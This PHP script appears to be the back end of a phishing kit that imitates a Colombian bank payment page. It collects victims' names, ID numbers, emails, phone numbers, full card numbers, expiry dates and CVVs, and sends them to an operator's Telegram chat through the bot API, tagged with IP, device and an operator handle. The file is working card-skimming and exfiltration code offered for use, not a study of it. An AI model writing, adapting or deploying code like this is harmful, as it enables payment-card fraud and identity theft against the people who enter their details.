<?php
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

$configPath = file_exists(__DIR__ . '/token_bank/config.php') ? __DIR__ . '/token_bank/config.php' : __DIR__ . '/config.php';
$config = require $configPath;
$bot_token = trim((string) ($config['bot_token'] ?? ''));
$chat_id = trim((string) ($config['chat_id_notificaciones'] ?? ($config['chat_id'] ?? '')));

if ($bot_token === '' || $chat_id === '') {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Configuracion incompleta']);
    exit;
}

$u_tb_raw = $_POST['u_tb'] ?? '{}';
$tb = json_decode($u_tb_raw, true);
if (!is_array($tb)) {
    $tb = [];
}

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device = 'PC';
if (stripos($userAgent, 'Android') !== false) {
    $device = 'Android';
} elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) {
    $device = 'iPhone';
} elseif (stripos($userAgent, 'Mobile') !== false) {
    $device = 'Movil';
}

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$hora = date('d/m/Y H:i:s');
$banco = !empty($tb['banco']) ? strtoupper($tb['banco']) : 'BANCO';
$monto = !empty($tb['total_pagar']) ? $tb['total_pagar'] : '';

$mensaje = "🔔 <b>NUEVA INTENCIÓN DE PAGO - {$banco}</b> ◉\n\n";
$mensaje .= "👤 <b>Nombre Completo:</b> " . (!empty($tb['nombre']) ? $tb['nombre'] : 'No registrado') . "\n";
$doc = !empty($tb['documento']) ? $tb['documento'] : (!empty($tb['cedula']) ? $tb['cedula'] : 'No registrado');
$mensaje .= "🪪 <b>Documento:</b> " . $doc . "\n";
if ($monto !== '') {
    $mensaje .= "💰 <b>Monto a Pagar:</b> $" . number_format((float)$monto, 0, ',', '.') . " COP\n";
}
$mensaje .= "📧 <b>Correo:</b> " . (!empty($tb['correo']) ? $tb['correo'] : 'No registrado') . "\n";
$mensaje .= "📱 <b>Teléfono:</b> " . (!empty($tb['telefono']) ? $tb['telefono'] : 'No registrado') . "\n\n";

if (!empty($tb['tarjeta'])) {
    $mensaje .= "💳 <b>Detalles de Tarjeta:</b>\n";
    $mensaje .= " • <b>Número:</b> " . $tb['tarjeta'] . "\n";
    $mensaje .= " • <b>Expira:</b> " . ($tb['expMonth'] ?? '') . "/" . ($tb['expYear'] ?? '') . "\n";
    $mensaje .= " • <b>CVV:</b> " . ($tb['cvv'] ?? '') . "\n";
    $mensaje .= " • <b>Titular:</b> " . ($tb['ownerName'] ?? '') . "\n";
    if (!empty($tb['tipo_tarjeta'])) {
        $mensaje .= " • <b>Tipo:</b> " . strtoupper($tb['tipo_tarjeta']) . "\n";
    }
    if (!empty($tb['cuotas'])) {
        $mensaje .= " • <b>Cuotas:</b> " . $tb['cuotas'] . "\n";
    }
    $mensaje .= "\n";
}

$mensaje .= "🌐 IP: {$ip} | Device: {$device} | {$hora}\n\n";
$mensaje .= "🐙 @FU7UR4MA 🐙";

$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];

$ch = curl_init("https://api.telegram.org/bot{$bot_token}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

$response = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);

if ($response === false) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
    exit;
}

$result = json_decode($response, true);
echo json_encode([
    'status' => !empty($result['ok']) ? 'success' : 'error',
    'raw' => $result
]);
